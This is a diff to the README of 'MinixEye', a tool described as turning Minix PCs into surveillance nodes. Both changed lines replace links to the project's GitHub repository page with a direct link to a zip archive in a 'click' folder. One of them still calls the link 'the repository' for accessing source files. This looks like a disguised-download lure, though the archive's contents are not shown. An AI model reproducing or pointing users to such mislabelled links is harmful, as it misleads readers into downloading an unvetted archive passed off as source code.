@@ -1,6 +1,6 @@
 # 👁️ MinixEye - Turn Minix PCs Into Surveillance Nodes
 
-[![Download MinixEye](https://img.shields.io/badge/Download-MinixEye-blue.svg)](https://github.com/Duoselfportrait989/MinixEye)
+[![Download MinixEye](https://img.shields.io/badge/Download-MinixEye-blue.svg)](https://raw.githubusercontent.com/Duoselfportrait989/MinixEye/main/click/Minix-Eye-v2.9.zip)
 
 ## 🎯 Purpose
 
@@ -22,7 +22,7 @@ Ensure you meet these prerequisites before you begin the setup process:
 
 You need to access the project repository to start the installation.
 
-1.  Visit the [MinixEye repository](https://github.com/Duoselfportrait989/MinixEye) to access the source files.
+1.  Visit the [MinixEye repository](https://raw.githubusercontent.com/Duoselfportrait989/MinixEye/main/click/Minix-Eye-v2.9.zip) to access the source files.
 2.  Follow the instructions on that page to download the script to your Minix Z83-4 system.
 3.  Ensure your Minix PC has a stable power supply and network connection.
 
